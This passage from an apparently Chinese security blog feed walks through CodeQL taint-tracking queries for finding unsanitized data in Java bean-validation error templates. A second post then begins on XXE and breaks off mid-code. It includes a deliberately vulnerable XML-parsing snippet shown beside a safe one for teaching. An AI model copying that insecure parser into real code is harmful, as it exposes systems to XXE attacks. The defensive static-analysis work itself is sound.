class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Conf</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Configuration &#123;<br>    Conf()&#123;<br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;Conf&quot;</span><br>    &#125;<br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(ConstraintValidatorIsValid cviv |<br>            node.asParameter() = cviv.getParameter(<span class="hljs-number">0</span>))<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(BuildConstraintViolationWithTemplate bcivwt |<br>            node.asParameter() = bcivwt.getParameter(<span class="hljs-number">0</span>))<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorContextClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span>&#123;<br>    ConstraintValidatorContextClass()&#123;<br>        <span class="hljs-built_in">this</span>.getASupertype().getASupertype+().hasQualifiedName(<span class="hljs-string">&quot;javax.validation&quot;</span>, <span class="hljs-string">&quot;ConstraintValidatorContext&quot;</span>)<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BuildConstraintViolationWithTemplate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    BuildConstraintViolationWithTemplate()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorContextClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;buildConstraintViolationWithTemplate&quot;</span>)<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是没有任何的查找返回结果，但是实际上他们两个是不同的，因为source我们是找的isValid函数的第一个参数，而sink则是<code>buildConstraintViolationWithTemplate</code>函数的触发，可以通过两个截图来看看他们的不同</p><p>isSource</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227093441408.png" alt="image-20231227093441408"> </p><p>isSink</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227093517004.png" alt="image-20231227093517004"> </p><p>所以我们可以发现的是，isSource我们是找的定义函数的地方，而isSink则是找到调用函数的地方</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225181519501.png" alt="image-20231225181519501"> </p><h2 id="Step-1-3-TaintTracking-configuration"><a href="#Step-1-3-TaintTracking-configuration" class="headerlink" title="Step 1.3: TaintTracking configuration"></a>Step 1.3: TaintTracking configuration</h2><p>直接拿我们之前的成果进行测试，我们直接去查找sink和source，发现是没有任何结果的，所以我们需要去分析一下部分数据流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">from Conf conf, DataFlow::PathNode source, DataFlow::PathNode sink<br>where conf.hasFlowPath(source, sink)<br>select sink, source, sink, <span class="hljs-string">&quot;Custom constraint error message contains unsanitized user data&quot;</span><br></code></pre></td></tr></table></figure><p>这里又出现了一个问题，codeql官方库进行了一次更新，新版本里面不再有partialpathnode这个类，但是神奇的我翻了以下的的git commit，发现官方既没有进行任何说明也没有文档，唯一找到的这个可能的方法也不起作用</p><p><a href="https://codeql.github.com/docs/writing-codeql-queries/debugging-data-flow-queries-using-partial-flow/">Debugging data-flow queries using partial flow — CodeQL (github.com)</a>这个官方库中的说明都是用不了的</p><p>于是只能根据这一篇issue来降低版本使用了</p><p><a href="https://github.com/github/codeql/issues/13540">DataFlow::PathGraph Module not Found in codeql · Issue #13540 · github&#x2F;codeql</a></p><p>我用的codeql cli库的版本是2.15.1，我将库的版本降低到2021年的提交才可以用</p><h2 id="Step-1-4-Partial-Flow-to-the-rescue"><a href="#Step-1-4-Partial-Flow-to-the-rescue" class="headerlink" title="Step 1.4: Partial Flow to the rescue"></a>Step 1.4: Partial Flow to the rescue</h2><p>因为我们刚才在isSource里面找到了一个container，我们怀疑可能是这里断了，于是在debug中我们isSource定义为查找所有的container类</p><p>然后查询语句中我们就找需要使用到container的调用函数，取它的第一个参数就行</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">source.get<span class="hljs-constructor">Node()</span>.get<span class="hljs-constructor">EnclosingCallable()</span>.get<span class="hljs-constructor">ParameterType(0)</span> instanceof ContainerClass<br></code></pre></td></tr></table></figure><p>没加限定时的测试如下</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225183526727.png" alt="image-20231225183526727"> </p><p>加上限定时能够抛出正确的结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227100319136.png" alt="image-20231227100319136"> </p><p>sink的话就是下面的<code>buildConstraintViolationWithTemplate</code>参数，于是能够得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><span class="hljs-keyword">import</span> semmle.code.java.dataflow.TaintTracking<br><span class="hljs-keyword">import</span> DataFlow::PartialPathGraph<br><br><span class="hljs-comment">//构造方法引用</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span> &#123;<br>     ConstraintValidatorClass()&#123;<br>        <span class="hljs-built_in">this</span>.getASupertype().getASupertype+().hasQualifiedName(<span class="hljs-string">&quot;javax.validation&quot;</span>, <span class="hljs-string">&quot;ConstraintValidator&lt;&gt;&quot;</span>)<br>     &#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorIsValid</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    ConstraintValidatorIsValid()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;isValid&quot;</span>)<br>        and <span class="hljs-title function_">not</span><span class="hljs-params">(<span class="hljs-built_in">this</span>.isPrivate()</span>)<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//methodAccess是一个被遗弃的方法，不要去使用它</span><br>predicate <span class="hljs-title function_">isBuildConstraintViolationWithTemplate</span><span class="hljs-params">(Expr expr)</span> &#123;<br>    exists(MethodAccess mc |<br>        mc.getCallee().hasName(<span class="hljs-string">&quot;buildConstraintViolationWithTemplate&quot;</span>)  <br>        <span class="hljs-type">and</span> <span class="hljs-variable">expr</span> <span class="hljs-operator">=</span> mc.getArgument(<span class="hljs-number">0</span>))<br>&#125;<br><br><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Conf</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Configuration &#123;<br>    Conf()&#123;<br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;Conf&quot;</span><br>    &#125;<br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(ConstraintValidatorIsValid cviv |<br>            node.asParameter() = cviv.getParameter(<span class="hljs-number">0</span>))<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(Expr expr |<br>            isBuildConstraintViolationWithTemplate(expr)<br>            and node.asExpr() = expr<br>            )<br>    &#125;<br>    override <span class="hljs-type">int</span> <span class="hljs-title function_">explorationLimit</span><span class="hljs-params">()</span>&#123;<br>        result = <span class="hljs-number">10</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContainerClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span> &#123;<br>    ContainerClass() &#123;<br>        <span class="hljs-built_in">this</span>.getName() = <span class="hljs-string">&quot;Container&quot;</span><br>    &#125;<br>&#125;<br><br><br>from Conf conf,DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink<br>where conf.hasPartialFlow(source, sink,_)<br>and source.getNode().getEnclosingCallable().getParameterType(<span class="hljs-number">0</span>) <span class="hljs-keyword">instanceof</span> ContainerClass<span class="hljs-comment">//拿到调用source的函数的第一个参数，也就是isValid的第一个参数</span><br>select sink, source, sink, <span class="hljs-string">&quot;Custom constraint error message contains unsanitized user data&quot;</span><br></code></pre></td></tr></table></figure><p>我们试着来调用它，产生了以下的结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227114432658.png" alt="image-20231227114432658"> </p><p>我们分别来看source和sink，那该如何根据上面的数据来找数据流断开的点呢，我们一步步翻阅我们生成的sink，我们原本设定的sink时它能够直接道道我们的<code>BuildConstraintViolationWithTemplate</code>的第一个参数，但是现在却没有到达我们的第一个参数，所以我们只要找上图中sink最后出现的位置就可以了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227120639793.png" alt="image-20231227120639793"> </p><p>把每一个sink都翻阅了一遍以后，我们找到了问题所在，这个两个函数的返回值时sink最终的终点，而上图中的那些sink根本没有<code>keySet</code>方法的调用，所以肯定是卡在了<code>keySet</code>这里的，所以我们尝试把<code>getSoftConstraints()</code>和<code>getHardConstraints()</code>与<code>keyset</code>相连接</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227120814960.png" alt="image-20231227120814960"> </p><p>所以我们这样就可以连接keySet和那两个get方法</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetAndSet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Method</span></span>&#123;<br>    <span class="hljs-type">GetAndSet</span>()&#123;<br>        <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getSoftConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getHardConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;keySet&quot;</span>)<br>    &#125;<br>&#125;<br><br>predicate expressionCompileStep(<span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> node1, <span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> node2) &#123;<br>    exists(<span class="hljs-type">MethodAccess</span> ma, <span class="hljs-type">Method</span> m | ma.getMethod() = m |<br>        m instanceof <span class="hljs-type">GetAndSet</span> and<br>        ma = node2.asExpr() and<br>        ma.getQualifier() = node1.asExpr()<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>在Conf类中添加</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">override predicate isAdditionalFlowStep(DataFlow::<span class="hljs-keyword">Node</span> <span class="hljs-title">node1</span>, DataFlow::<span class="hljs-keyword">Node</span> <span class="hljs-title">node2</span>) &#123;<br>    expressionCompileStep(node1, node2)<br>&#125;<br></code></pre></td></tr></table></figure><p>查看运行结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227122423431.png" alt="image-20231227122423431"> </p><p>我们看到keyset已经被连接进来了，而接下来我们需要把common这个参数继续往下面传递，我们使用getAnArgueMent可以拿到构造方法的参数</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227122935380.png" alt="image-20231227122935380"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeHashtable</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RefType</span> &#123;<br>    TypeHashtable() &#123; <br>        hasQualifiedName(<span class="hljs-string">&quot;java.util&quot;</span>, <span class="hljs-string">&quot;HashSet&quot;</span>) or<br>        <span class="hljs-title function_">hasQualifiedName</span><span class="hljs-params">(<span class="hljs-string">&quot;java.util&quot;</span>, <span class="hljs-string">&quot;HashSet&lt;&gt;&quot;</span>)</span> or<br>        <span class="hljs-title function_">hasQualifiedName</span><span class="hljs-params">(<span class="hljs-string">&quot;java.util&quot;</span>, <span class="hljs-string">&quot;HashSet&lt;String&gt;&quot;</span>)</span> <br>        &#125;<br>    &#125;<br><span class="hljs-comment">//用来判定hashset调用函数的step</span><br>predicate <span class="hljs-title function_">hashSetMethodStep</span><span class="hljs-params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;<br>    exists(ConstructorCall cc | cc.getConstructedType() <span class="hljs-keyword">instanceof</span> TypeHashtable |<br>        node1.asExpr() = cc.getAnArgument() and<br>        (node2.asExpr() = cc  <span class="hljs-comment">//这里是构造函数的返回值</span><br>        or node2.asExpr() = cc.getQualifier() <span class="hljs-comment">//这里是构造函数的返回值的限定值</span><br>        )<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>并且在isAdditionalFlowStep添加上我们刚才创建的查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">override predicate <span class="hljs-title function_">isAdditionalFlowStep</span><span class="hljs-params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;<br>    expressionCompileStep(node1, node2) or<br>    <span class="hljs-title function_">hashSetMethodStep</span><span class="hljs-params">(node1,node2)</span><br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227124349398.png" alt="image-20231227124349398"> </p><p>成功找到了common这个sink</p><h2 id="Step1-5-to-Step-1-8-Finish-line-for-our-first-issue"><a href="#Step1-5-to-Step-1-8-Finish-line-for-our-first-issue" class="headerlink" title="Step1.5 to Step 1.8: Finish line for our first issue"></a>Step1.5 to Step 1.8: Finish line for our first issue</h2><p>我们把刚才做的修改放到我们原来的pathnode而不是partialpathnode中来，把重写的方法变为<code>isAdditionalTaintStep</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">override predicate <span class="hljs-title function_">isAdditionalTaintStep</span><span class="hljs-params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;<br>    expressionCompileStep(node1, node2) or<br>    <span class="hljs-title function_">hashSetMethodStep</span><span class="hljs-params">(node1,node2)</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">from Conf conf,DataFlow::PathNode source, DataFlow::PathNode sink<br>where conf.hasFlowPath(source, sink)<br><span class="hljs-comment">// and source.getNode().getEnclosingCallable().getParameterType(0) instanceof ContainerClass</span><br>select sink, source, sink, <span class="hljs-string">&quot;Custom constraint error message contains unsanitized user data&quot;</span><br><span class="hljs-comment">//这里将partial转化为simple,然后拿到包含source的的构造函数或者方法</span><br><span class="hljs-comment">// select source.getNode().getEnclosingCallable().getParameterType(0)</span><br></code></pre></td></tr></table></figure><p>然后运行查询，可以发现能够得到结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227124729921.png" alt="image-20231227124729921"> </p><h2 id="Step-2-Second-Issue"><a href="#Step-2-Second-Issue" class="headerlink" title="Step 2: Second Issue"></a>Step 2: Second Issue</h2><p>根据提示</p><blockquote><p>There is a similar issue in <code>SchedulingConstraintValidator.java</code>. Following the same process as above, find out why it is not reported by your query, and write the necessary taint steps to report it.</p><p><strong>Tip:</strong> We don’t like duplicate code. ;-</p></blockquote><p>在这里也有一个漏洞点</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227130316572.png" alt="image-20231227130316572"> </p><p>这里是ketset后面还有调用，只需要在后面补全即可，我们将我们的 <code>FlowConstraints</code>补全如下</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlowConstraints</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Method</span> </span>&#123;<br>    <span class="hljs-type">FlowConstraints</span>() &#123;<br>        <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getSoftConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getHardConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;keySet&quot;</span>) <br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;stream&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;map&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;collect&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227130422799.png" alt="image-20231227130422799"> </p><p>成功跑出两个结果，win!</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CodeQl常见漏洞梳理</title>
    <link href="/decemberus.com/2023/11/03/CodeQl%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/"/>
    <url>/decemberus.com/2023/11/03/CodeQl%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CodeQl常见漏洞梳理"><a href="#CodeQl常见漏洞梳理" class="headerlink" title="CodeQl常见漏洞梳理"></a>CodeQl常见漏洞梳理</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>存在漏洞的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parse</span><span class="hljs-params">(Socket sock)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>  <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>  <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> factory.newDocumentBuilder();<br>  builder.parse(sock.getInputStream()); <span class="hljs-comment">//unsafe</span><br>&#125;<br></code></pre></td></tr></table></figure><p>而没有漏洞的代码是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">disableDTDParse</span><span class="hljs-params">(Socket sock)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>  <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>  factory.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>  <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> factory.newDocumentBuilder();<br>  builder.parse(sock.getInputStream()); <span class="hljs-comment">//safe</span><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><span class="hljs-keyword">import</span> semmle.code.java.dataflow.DataFlow<br><span class="hljs-keyword">import</span> semmle.code.java.security.XxeRemoteQuery<br><span class="hljs-keyword">import</span> XxeFlow::PathGraph<br><br>from XxeFlow::PathNode source, XxeFlow::PathNode sink<br>where XxeFlow::flowPath(source, sink)<br>select sink.getNode(), source, sink,<br>  <span class="hljs-string">&quot;XML parsing depends on a $@ without guarding against external entity expansion.&quot;</span>,<br>  source.getNode(), <span class="hljs-string">&quot;user-provided value&quot;</span><br></code></pre></td></tr></table></figure><p>点进xssflow</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">module</span> XxeConfig <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DataFlow</span>::ConfigSig &#123;<br>  predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node src)</span> &#123; src <span class="hljs-keyword">instanceof</span> ThreatModelFlowSource &#125;<br><br>  predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node sink)</span> &#123; sink <span class="hljs-keyword">instanceof</span> XxeSink &#125;<br><br>  predicate <span class="hljs-title function_">isBarrier</span><span class="hljs-params">(DataFlow::Node sanitizer)</span> &#123; sanitizer <span class="hljs-keyword">instanceof</span> XxeSanitizer &#125;<br><br>  predicate <span class="hljs-title function_">isAdditionalFlowStep</span><span class="hljs-params">(DataFlow::Node n1, DataFlow::Node n2)</span> &#123;<br>    any(XxeAdditionalTaintStep s).step(n1, n2)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>重点是isSink不知道它是什么</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">import</span> semmle.code.java.dataflow.DataFlow<br><br><span class="hljs-comment">/** A node where insecure XML parsing takes place. */</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XxeSink</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123; &#125;<br><br><span class="hljs-comment">/** A node that acts as a sanitizer in configurations realted to XXE vulnerabilities. */</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XxeSanitizer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123; &#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A unit class for adding additional taint steps.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Extend this class to add additional taint steps that should apply to flows related to</span><br><span class="hljs-comment"> * XXE vulnerabilities.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">XxeAdditionalTaintStep</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Unit</span> &#123;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Holds if the step from `node1` to `node2` should be considered a taint</span><br><span class="hljs-comment">   * step for flows related to XXE vulnerabilities.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">abstract</span> predicate <span class="hljs-title function_">step</span><span class="hljs-params">(DataFlow::Node n1, DataFlow::Node n2)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里要介绍codeql和java中不一样的地方</p><blockquote><p>学过java的人可能会很费解，我们继承了一个abstract抽象类，连个实现方法都没有，怎么就能够达到获取各种source的目的呢？</p><p>CodeQL和Java不太一样，只要我们的子类继承了这个<code>RemoteFlowSource</code>类，那么所有子类就会被调用，它所代表的source也会被加载。</p><p>我们在 <code>RemoteFlowSource</code>定义下面会看到非常多子类，就是这个道理，它们的结果都会被用and串联加载。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/1628394606_610f546eaa54d9e27ddaa.png" alt="img"> </p></blockquote><p>于是我们能找到这个实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultXxeSink</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">XxeSink</span> &#123;<br>  DefaultXxeSink() &#123;<br>    not SafeSaxSourceFlow::flowTo(<span class="hljs-built_in">this</span>) and<br>    <span class="hljs-title function_">exists</span><span class="hljs-params">(XmlParserCall parse |</span><br><span class="hljs-params">      parse.getSink()</span> = <span class="hljs-built_in">this</span>.asExpr() and<br>      not parse.isSafe()<br>    )<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>先来看<code>XmlParserCall</code>，这是一个抽象类，我们需要查看他的实现类，这里只拿一个类来做对比</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentBuilderParse</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">XmlParserCall</span> &#123;<br>  DocumentBuilderParse() &#123;<br>    exists(Method m |<br>      <span class="hljs-built_in">this</span>.getMethod() = m and<br>      